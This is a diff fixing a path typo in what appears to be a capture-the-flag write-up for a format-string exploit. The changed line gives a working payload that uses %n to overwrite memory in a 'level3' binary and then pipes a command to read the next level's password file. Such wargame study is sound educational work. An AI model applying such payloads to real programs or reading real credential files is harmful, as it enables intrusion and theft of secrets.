@@ -21,4 +21,4 @@ breakpoint, we use : `x/100x $sp`. This lets us see where our input appears on t
 stack, and how many arguments to skip to reach the %n.
 
 Now we have all the information to build the final command:
-`(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' ; echo "cat /home/user level4/.pass") | ./level3`
+`(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' ; echo "cat /home/user/level4/.pass") | ./level3`
